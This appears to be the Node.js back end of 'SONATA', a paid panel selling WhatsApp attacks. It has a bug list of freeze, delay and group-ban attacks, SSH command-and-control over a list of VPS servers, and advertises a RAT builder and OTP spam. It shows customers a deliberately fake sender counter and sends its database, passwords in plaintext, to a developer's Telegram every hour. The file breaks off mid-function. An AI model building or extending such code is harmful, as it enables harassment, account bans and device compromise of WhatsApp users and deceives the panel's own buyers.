

const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);

process.on('unhandledRejection', (reason) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;

// ═══════════════════════════════════════════════════════════════════════
//  BAILEYS IMPORT
// ═══════════════════════════════════════════════════════════════════════
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');

// ═══════════════════════════════════════════════════════════════════════
//  OTHER IMPORTS
// ═══════════════════════════════════════════════════════════════════════
require('dotenv').config();
const express = require("express");
const bodyParser = require('body-parser');
const readline = require("readline");
const crypto = require("crypto");
const cors = require('cors');
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino');
const axios = require('axios');
const vm = require('vm');
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const { Server } = require('socket.io');
const { Client } = require('ssh2');
const multer = require('multer');
const { exec, execSync } = require('child_process');

// ═══════════════════════════════════════════════════════════════════════
//  SERVER INIT
// ═══════════════════════════════════════════════════════════════════════
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 100 * 1024 * 1024
});

const wss = new WebSocket.Server({ server, path: '/ws-raw' });

// ═══════════════════════════════════════════════════════════════════════
//  GLOBAL STATE
// ═══════════════════════════════════════════════════════════════════════
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';

const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000;

const qrCodes = {};
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');

let cncActive = true;
let vpsList = [];
let vpsConnections = {};
const VPS_FILE = 'vps.json';

let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// ─── Folder buat fitur baru ───────────────────────────────────────────
const UPLOADS_DIR = path.join(__dirname, 'uploads');
const STORIES_DIR = path.join(UPLOADS_DIR, 'stories');
const SOCIAL_DIR = path.join(UPLOADS_DIR, 'social');
const DOWNLOADS_DIR = path.join(__dirname, 'public', 'downloads');
const UPDATES_DIR = path.join(__dirname, 'updates');

for (const dir of [UPLOADS_DIR, STORIES_DIR, SOCIAL_DIR, DOWNLOADS_DIR, UPDATES_DIR]) {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
}

// ─── Multer setup ─────────────────────────────────────────────────────
function diskStorageCustom(folder) {
  return multer.diskStorage({
    destination: folder,
    filename: (req, file, cb) => {
      const ext = path.extname(file.originalname || '').toLowerCase().replace(/[^a-z0-9.]/g, '');
      cb(null, `${Date.now()}_${crypto.randomBytes(4).toString('hex')}${ext}`);
    }
  });
}

const uploadIcon = multer({ storage: diskStorageCustom(UPLOADS_DIR), limits: { fileSize: 100 * 1024 * 1024 } });
const uploadStory = multer({ storage: diskStorageCustom(STORIES_DIR), limits: { fileSize: 100 * 1024 * 1024 } });
const uploadSocial = multer({ storage: diskStorageCustom(SOCIAL_DIR), limits: { fileSize: 100 * 1024 * 1024 } });
const BUKTI_DIR = path.join(UPLOADS_DIR, 'bukti_trx');
if (!fs.existsSync(BUKTI_DIR)) fs.mkdirSync(BUKTI_DIR, { recursive: true });
const uploadBukti = multer({ storage: diskStorageCustom(BUKTI_DIR), limits: { fileSize: 100 * 1024 * 1024 } });
const uploadUpdate = multer({ storage: diskStorageCustom(UPDATES_DIR), limits: { fileSize: 500 * 1024 * 1024 }, fileFilter: (req,file,cb) => { const ext=path.extname(file.originalname||'').toLowerCase(); cb(ext === '.apk' ? null : new Error('Hanya file APK yang diperbolehkan'), ext === '.apk'); } });

// ─── CREATE ACCOUNT PENDING + HISTORY + GROUP LINK JSON ───────────────
const PENDING_CREATE_PATH = path.join(__dirname, 'pending_creates.json');
const CREATE_HISTORY_PATH = path.join(__dirname, 'create_history.json');
const DEV_BACKUP_CHAT_ID = String(process.env.DEV_BACKUP_CHAT_ID || process.env.OWNER_ID || '').trim();
const ACC_GROUP_ID = String(process.env.TELEGRAM_CREATE_NOTIFY_GROUP_ID || '').trim();

function loadJsonFile(p, fallback) {
  try {
    if (!fs.existsSync(p)) return fallback;
    return JSON.parse(fs.readFileSync(p, 'utf8'));
  } catch { return fallback; }
}
function saveJsonFile(p, data) {
  fs.writeFileSync(p, JSON.stringify(data, null, 2));
}
function loadPendingCreates() { return loadJsonFile(PENDING_CREATE_PATH, []); }
function savePendingCreates(d) { saveJsonFile(PENDING_CREATE_PATH, d); }
function loadCreateHistory() { return loadJsonFile(CREATE_HISTORY_PATH, []); }
function saveCreateHistory(d) { saveJsonFile(CREATE_HISTORY_PATH, d); }

function pushCreateHistory(entry) {
  const h = loadCreateHistory();
  h.unshift(entry);
  if (h.length > 500) h.length = 500;
  saveCreateHistory(h);
}

async function backupDatabaseToDev(reason) {
  try {
    if (!bot || !DEV_BACKUP_CHAT_ID || !fs.existsSync(DB_PATH)) return;
    await bot.sendDocument(DEV_BACKUP_CHAT_ID, DB_PATH, {
      caption: `📦 <b>BACKUP database.json</b>\n${reason}\n⏱ ${new Date().toISOString()}`,
      parse_mode: 'HTML'
    });
  } catch (e) {
    console.error('[BACKUP] gagal kirim database.json ke DEV:', e.message);
  }
}

setInterval(() => {
  void backupDatabaseToDev('Backup otomatis setiap 1 jam');
}, 60 * 60 * 1000);

// ═══════════════════════════════════════════════════════════════════════
//  HARGA PAKET (UPDATE — harga baru)
// ═══════════════════════════════════════════════════════════════════════
const PURCHASE_PRICES = {
  member_day:   { role: 'member',   day: 1,  price: 2000,   label: 'MEMBER 1 HARI' },
  member_week:  { role: 'member',   day: 7,  price: 10000,  label: 'MEMBER 1 MINGGU' },
  member_month: { role: 'member',   day: 30, price: 20000,  label: 'MEMBER 1 BULAN' },
  fullup:       { role: 'fullup',   day: 30, price: 40000,  label: 'FULLUP' },
  reseller:     { role: 'reseller', day: 30, price: 80000,  label: 'RESELLER' },
  owner:        { role: 'owner',    day: 30, price: 180000, label: 'OWNER' }
};
const UPGRADE_PRICES = {
  'member:fullup': 38000, 'member:reseller': 78000, 'member:owner': 178000,
  'fullup:reseller': 40000, 'fullup:owner': 140000, 'reseller:owner': 100000
};
const PURCHASE_FILE = path.join(__dirname, 'purchase_requests.json');
function loadPurchases() { const value = loadJsonFile(PURCHASE_FILE, []); return Array.isArray(value) ? value : []; }
function savePurchases(v) { if (!Array.isArray(v)) throw new TypeError('Data riwayat penjualan harus berupa array'); saveJsonFile(PURCHASE_FILE, v); }

function canCreatorMakeRole(creatorRole, targetRole) {
  const cr = String(creatorRole || '').toLowerCase();
  const tr = String(targetRole || '').toLowerCase();
  if (['dev','pemula'].includes(cr)) return true;
  const allowed = CAN_CREATE_ROLES[cr] || [];
  return allowed.includes(tr);
}

function needsPhotoForCreate(creatorRole) {
  return !['dev','pemula'].includes(String(creatorRole || '').toLowerCase());
}

function clampMemberDays(role, day) {
  let d = parseInt(day || 30, 10);
  if (!Number.isFinite(d) || d < 1) d = 30;
  if (String(role).toLowerCase() === 'member' && d > 30) d = 30;
  return d;
}

function buildAccountObject({ username, password, role, day, createdBy }) {
  const roleKey = String(role || 'member').toLowerCase();
  const days = clampMemberDays(roleKey, day);
  const expired = new Date();
  expired.setDate(expired.getDate() + days);
  return {
    username: String(username).trim(),
    password: String(password),
    role: roleKey,
    uid: crypto.createHash('md5').update(String(username).trim()).digest('hex'),
    expiredDate: expired.toISOString().split('T')[0],
    createdBy: createdBy || 'SYSTEM',
    createdAt: new Date().toISOString(),
    day: days
  };
}

async function commitAccountCreate(account, meta = {}) {
  const db = loadDatabase();
  if (db.find(u => u.username === account.username)) {
    return { ok: false, message: 'Username already exists.' };
  }
  db.push(account);
  saveDatabase(db);
  rememberUserIdentity(account, meta.source || 'SYSTEM');
  pushCreateHistory({
    id: account.uid + '_' + Date.now(),
    username: account.username,
    role: account.role,
    day: account.day,
    expiredDate: account.expiredDate,
    createdBy: account.createdBy,
    status: meta.status || 'accepted',
    note: meta.note || '',
    photoPath: meta.photoPath || null,
    createdAt: account.createdAt,
    decidedAt: new Date().toISOString()
  });
  void notifyAccountCreated(account, meta.source || 'APK');
  void backupDatabaseToDev(`Create akun: ${account.username} (${account.role}) by ${account.createdBy}`);
  try {
    saveUserLog(account.createdBy, 'create', 'Buat Akun', `User: ${account.username} | Role: ${account.role} | Day: ${account.day}`);
  } catch (_) {}
  return { ok: true, user: account };
}

async function sendCreateToTelegramGroup({ account, creator, photoPath, autoAccept }) {
  const esc = (v) => String(v ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const pendingId = 'pc_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
  const caption =
    `🧾 <b>BUKTI TRX — CREATE AKUN</b>\n\n` +
    `<b>Creator:</b> <code>${esc(creator.username)}</code> (${esc((creator.role || '').toUpperCase())})\n` +
    `<b>User baru:</b> <code>${esc(account.username)}</code>\n` +
    `<b>Role:</b> <b>${esc(account.role.toUpperCase())}</b>\n` +
    `<b>Durasi:</b> ${esc(account.day)} hari\n` +
    `<b>Expired:</b> ${esc(account.expiredDate)}\n` +
    (autoAccept
      ? `\n✅ <b>ROLE MEMBER — AUTO CREATE</b> (tanpa ACC)`
      : `\n⏳ Menunggu <b>ACC / TOLAK</b>`);

  const opts = { caption, parse_mode: 'HTML' };
  if (!autoAccept) {
    opts.reply_markup = {
      inline_keyboard: [[
        { text: '✅ ACC', callback_data: `acc_create_${pendingId}` },
        { text: '❌ TOLAK', callback_data: `rej_create_${pendingId}` }
      ]]
    };
    const pending = loadPendingCreates();
    pending.push({
      id: pendingId,
      account,
      creatorUsername: creator.username,
      creatorRole: creator.role,
      photoPath: photoPath || null,
      status: 'pending',
      createdAt: new Date().toISOString()
    });
    savePendingCreates(pending);
    pushCreateHistory({
      id: pendingId,
      username: account.username,
      role: account.role,
      day: account.day,
      expiredDate: account.expiredDate,
      createdBy: creator.username,
      status: 'pending',
      note: 'Menunggu ACC Telegram',
      photoPath: photoPath || null,
      createdAt: new Date().toISOString()
    });
  }

  try {
    if (photoPath && fs.existsSync(photoPath)) {
      await bot.sendPhoto(ACC_GROUP_ID, photoPath, opts);
    } else {
      await bot.sendMessage(ACC_GROUP_ID, caption + '\n\n⚠️ Foto tidak tersedia', { parse_mode: 'HTML', reply_markup: opts.reply_markup });
    }
  } catch (e) {
    console.error('[CREATE-TRX] gagal kirim telegram:', e.message);
    return { ok: false, message: 'Gagal kirim ke Telegram: ' + e.message };
  }
  return { ok: true, pendingId: autoAccept ? null : pendingId };
}

// ═══════════════════════════════════════════════════════════════════════
//  FAKE GLOBAL SENDER COUNTER
// ═══════════════════════════════════════════════════════════════════════
let FAKE_GLOBAL_COUNT = 25;

function refreshFakeGlobalCount() {
  FAKE_GLOBAL_COUNT = 1 + Math.floor(Math.random() * 7);
  console.log(`[FAKE] Global sender count → ${FAKE_GLOBAL_COUNT}`);
}

setInterval(refreshFakeGlobalCount, 2 * 60 * 1000);
refreshFakeGlobalCount();

// ═══════════════════════════════════════════════════════════════════════
//  BUG LIST
// ═══════════════════════════════════════════════════════════════════════
const bugs = [
  { bug_id: "fcc",         bug_name: "FREZEE" },
  { bug_id: "redgrayx1",         bug_name: "FREEZEE" },
  { bug_id: "redgrayx2",         bug_name: "DELAY HARD" },
  { bug_id: "roid_group",  bug_gb:   "BAN GROUP WA" },
];

// ═══════════════════════════════════════════════════════════════════════
//  HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) {
        fs.writeFileSync(filePath, '');
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ═══════════════════════════════════════════════════════════════════════
//  TELEGRAM BOT
// ═══════════════════════════════════════════════════════════════════════
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
if (!TOKEN) {
  throw new Error('•SONATA• TELEGRAM_BOT_TOKEN wajib diisi di .env');
}
const bot = new TelegramBot(TOKEN, { polling: true });

// ═══════════════════════════════════════════════════════════════════════
//  DATABASE
// ═══════════════════════════════════════════════════════════════════════
const DB_META_USERNAME = '__SONATA_DATABASE_META__';

function defaultDatabaseMeta() {
  return {
    _meta: true,
    username: DB_META_USERNAME,
    version: 2,
    knownUserIds: [],
    telegramUserIds: [],
    groupLinkOwners: [],
    accountHistory: []
  };
}

function readDatabaseRaw() {
  if (!fs.existsSync(DB_PATH)) return [];
  try {
    const parsed = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
    return Array.isArray(parsed) ? parsed : [];
  } catch (_) {
    return [];
  }
}

function loadDatabaseMeta() {
  const raw = readDatabaseRaw();
  const meta = raw.find(x => x && x._meta === true && x.username === DB_META_USERNAME);
  return { ...defaultDatabaseMeta(), ...(meta || {}) };
}

function saveDatabaseMeta(meta) {
  const raw = readDatabaseRaw().filter(x => !(x && x._meta === true && x.username === DB_META_USERNAME));
  raw.unshift({ ...defaultDatabaseMeta(), ...meta, _meta: true, username: DB_META_USERNAME });
  fs.writeFileSync(DB_PATH, JSON.stringify(raw, null, 2));
}

function rememberUserIdentity(user, source = 'SYSTEM') {
  if (!user) return;
  const meta = loadDatabaseMeta();
  const uid = String(user.uid || '').trim();
  const username = String(user.username || '').trim();
  const telegramId = String(user.telegramId || '').trim();
  if (uid && !meta.knownUserIds.includes(uid)) meta.knownUserIds.push(uid);
  if (telegramId && !meta.telegramUserIds.includes(telegramId)) meta.telegramUserIds.push(telegramId);
  if (username) {
    const exists = meta.accountHistory.find(x => x.username === username);
    if (!exists) meta.accountHistory.push({ username, uid, telegramId, role: user.role || '', source, firstSeenAt: new Date().toISOString() });
    else {
      exists.uid = uid || exists.uid;
      exists.telegramId = telegramId || exists.telegramId;
      exists.role = user.role || exists.role;
      exists.lastSeenAt = new Date().toISOString();
    }
  }
  saveDatabaseMeta(meta);
}

function loadDatabase() {
  const raw = readDatabaseRaw();
  const users = raw.filter(x => !(x && x._meta === true && x.username === DB_META_USERNAME));
  if (!fs.existsSync(DB_PATH)) {
    saveDatabase(users);
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  return users;
}

function saveDatabase(data) {
  const meta = loadDatabaseMeta();
  const users = Array.isArray(data) ? data.filter(x => !(x && x._meta === true)) : [];
  for (const user of users) {
    const uid = String(user.uid || '').trim();
    const telegramId = String(user.telegramId || '').trim();
    if (uid && !meta.knownUserIds.includes(uid)) meta.knownUserIds.push(uid);
    if (telegramId && !meta.telegramUserIds.includes(telegramId)) meta.telegramUserIds.push(telegramId);
    if (user.username) {
      let h = meta.accountHistory.find(x => x.username === user.username);
      if (!h) {
        h = { username: String(user.username), uid, telegramId, role: user.role || '', source: user.accountType || user.createdBy || 'SYSTEM', firstSeenAt: user.createdAt || new Date().toISOString() };
        meta.accountHistory.push(h);
      } else {
        h.uid = uid || h.uid;
        h.telegramId = telegramId || h.telegramId;
        h.role = user.role || h.role;
        h.lastSeenAt = new Date().toISOString();
      }
    }
  }
  fs.writeFileSync(DB_PATH, JSON.stringify([{ ...defaultDatabaseMeta(), ...meta, _meta: true, username: DB_META_USERNAME }, ...users], null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  return key;
}

function isExpired(user) {
  return new Date(user.expiredDate) < new Date();
}

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo?.username);
  return user ? keyInfo.username : null;
}

function getUserUid(user) {
  if (!user.uid) {
    user.uid = crypto.createHash('md5').update(user.username).digest('hex');
  }
  return user.uid;
}

// ═══════════════════════════════════════════════════════════════════════
//  KEY LIST
// ═══════════════════════════════════════════════════════════════════════
const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try { return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8')); }
  catch { return []; }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);
  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }
  saveKeyList(list);
}

// ═══════════════════════════════════════════════════════════════════════
//  LOAD ACTIVE KEYS
// ═══════════════════════════════════════════════════════════════════════
if (fs.existsSync(KEY_FILE)) {
  try {
    const parsed = JSON.parse(fs.readFileSync(KEY_FILE, 'utf8'));
    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;
        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }
    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  NEWS
// ═══════════════════════════════════════════════════════════════════════
const news = [
  {
    image: "https://files.catbox.moe/zggjy2.jpg",
    title: "SONATA V1",
    desc: "Role baru + Auto Builder RAT"
  },
  {
    image: "https://files.catbox.moe/5tyvp4.jpg",
    title: "PENAMBAHAN SENDER GLOBAL",
    desc: "Group role + Spam OTP"
  }
];

// ═══════════════════════════════════════════════════════════════════════
//  USER LOGS
// ═══════════════════════════════════════════════════════════════════════
const LOGS_DIR = path.join(__dirname, 'user_logs');

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }
  const files = fs.readdirSync(LOGS_DIR);
  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }
  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];
    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }
    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });
    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  ONLINE USERS
// ═══════════════════════════════════════════════════════════════════════
const ONLINE_TTL_MS = 30 * 1000;
const onlineUsers = new Map();
function markOnline(username, role = 'member') {
  if (!username) return;
  onlineUsers.set(String(username), { username: String(username), role: String(role || 'member'), lastSeen: Date.now() });
}
function pruneOnlineUsers() {
  const cutoff = Date.now() - ONLINE_TTL_MS;
  for (const [username, info] of onlineUsers.entries()) {
    if (!info || info.lastSeen < cutoff) onlineUsers.delete(username);
  }
}
function onlineUserList() {
  pruneOnlineUsers();
  return [...onlineUsers.values()].map(({username, role}) => ({ username, role, online: true }));
}
setInterval(pruneOnlineUsers, 5000).unref();

// ═══════════════════════════════════════════════════════════════════════
//  EXPRESS MIDDLEWARE
// ═══════════════════════════════════════════════════════════════════════
app.use(express.urlencoded({ extended: false, limit: '500mb' }));
app.use(express.json({ limit: '500mb' }));
app.use(cors());
app.use(bodyParser.json({ limit: '500mb' }));

app.use('/uploads', express.static(UPLOADS_DIR));
app.use('/updates', express.static(UPDATES_DIR));
app.use('/downloads', express.static(DOWNLOADS_DIR));

// ─── RATE LIMITER ─────────────────────────────────────────────────────
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 20) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);
    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }
  next();
}
app.use(rateLimiter);

// ─── CORS ─────────────────────────────────────────────────────────────
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization, x-auth-token");
  next();
});

// ═══════════════════════════════════════════════════════════════════════
//  VPS MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════
function connectToAllVPS() {
  if (!cncActive) return;
  console.log("🔄 Connecting to all VPS servers...");
  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }
    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }
      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];
        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;
  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// ═══════════════════════════════════════════════════════════════════════
//  JAVA HELPER
// ═══════════════════════════════════════════════════════════════════════
const JAVA_LOCAL_DIR = path.join(__dirname, 'jdk');
let JAVA_BIN_CACHED = null;

function getArchForJdk() {
  const a = os.arch();
  if (a === 'x64' || a === 'x86_64') return 'x64';
  if (a === 'arm64' || a === 'aarch64') return 'aarch64';
  return a;
}

function findLocalJavaBinary() {
  const candidates = [
    path.join(JAVA_LOCAL_DIR, 'bin', 'java'),
    path.join(__dirname, 'java', 'bin', 'java'),
    path.join(__dirname, 'jdk-17', 'bin', 'java'),
  ];
  try {
    if (fs.existsSync(JAVA_LOCAL_DIR)) {
      const walk = (dir, depth = 0) => {
        if (depth > 3) return;
        for (const name of fs.readdirSync(dir)) {
          const full = path.join(dir, name);
          try {
            const st = fs.statSync(full);
            if (st.isDirectory()) {
              if (name === 'bin') {
                const j = path.join(full, 'java');
                if (fs.existsSync(j)) candidates.unshift(j);
              } else {
                walk(full, depth + 1);
              }
            }
          } catch (_) {}
        }
      };
      walk(JAVA_LOCAL_DIR);
    }
  } catch (_) {}

  for (const c of candidates) {
    try {
      if (fs.existsSync(c)) {
        fs.chmodSync(c, 0o755);
        execSync(`"${c}" -version`, { stdio: 'ignore', timeout: 5000 });
        return c;
      }
    } catch (_) {}
  }
  return null;
}

function findSystemJavaBinary() {
  const candidates = [
    'java',
    '/usr/bin/java',
    '/usr/local/bin/java',
    '/usr/lib/jvm/default-java/bin/java',
    '/usr/lib/jvm/java-17-openjdk/bin/java',
    '/usr/lib/jvm/java-17-openjdk-amd64/bin/java',
    '/usr/lib/jvm/jre-17/bin/java',
  ];
  for (const c of candidates) {
    try {
      execSync(`"${c}" -version`, { stdio: 'ignore', timeout: 3000 });
      return c;
    } catch (_) {}
  }
  return null;
}

function findJavaBinary() {
  if (JAVA_BIN_CACHED) {
    try {
      execSync(`"${JAVA_BIN_CACHED}" -version`, { stdio: 'ignore', timeout: 3000 });
      return JAVA_BIN_CACHED;
    } catch (_) {
      JAVA_BIN_CACHED = null;
    }
  }
  const local = findLocalJavaBinary();
  if (local) {
    JAVA_BIN_CACHED = local;
    return local;
  }
  const sys = findSystemJavaBinary();
  if (sys) {
    JAVA_BIN_CACHED = sys;
    return sys;
  }
  return 'java';
}

function isJavaInstalled() {
  try {
    const bin = findJavaBinary();
    execSync(`"${bin}" -version`, { stdio: 'ignore', timeout: 5000 });
    return true;
  } catch (_) {
    return false;
  }
}

function getJavaVersionString() {
  try {
    const bin = findJavaBinary();
    const v = execSync(`"${bin}" -version 2>&1`, { encoding: 'utf8', timeout: 5000 });
    return (v.split('\n')[0] || 'Installed').trim();
  } catch (_) {
    return null;
  }
}

async function downloadPortableJdk() {
  const arch = getArchForJdk();
  const apiUrl = `https://api.adoptium.net/v3/binary/latest/17/ga/linux/${arch}/jre/hotspot/normal/eclipse?project=jdk`;

  console.log(`[JAVA] 📥 Download portable JRE 17 (${arch})...`);
  console.log(`[JAVA] URL: ${apiUrl}`);

  if (!fs.existsSync(JAVA_LOCAL_DIR)) {
    fs.mkdirSync(JAVA_LOCAL_DIR, { recursive: true });
  }

  const tarPath = path.join(__dirname, 'jdk-portable.tar.gz');

  const resp = await axios.get(apiUrl, {
    responseType: 'arraybuffer',
    timeout: 300000,
    maxRedirects: 5,
    headers: { 'User-Agent': 'AstralEngine-JavaBootstrap/1.0' },
    validateStatus: (s) => s >= 200 && s < 400,
  });

  fs.writeFileSync(tarPath, Buffer.from(resp.data));
  const sizeMb = (resp.data.byteLength / 1024 / 1024).toFixed(1);
  console.log(`[JAVA] ✅ Download selesai (${sizeMb} MB). Extract...`);

  try {
    execSync(`tar -xzf "${tarPath}" -C "${JAVA_LOCAL_DIR}" --strip-components=1`, {
      timeout: 120000,
      stdio: 'ignore',
    });
  } catch (e1) {
    try {
      execSync(`tar -xzf "${tarPath}" -C "${JAVA_LOCAL_DIR}"`, {
        timeout: 120000,
        stdio: 'ignore',
      });
    } catch (e2) {
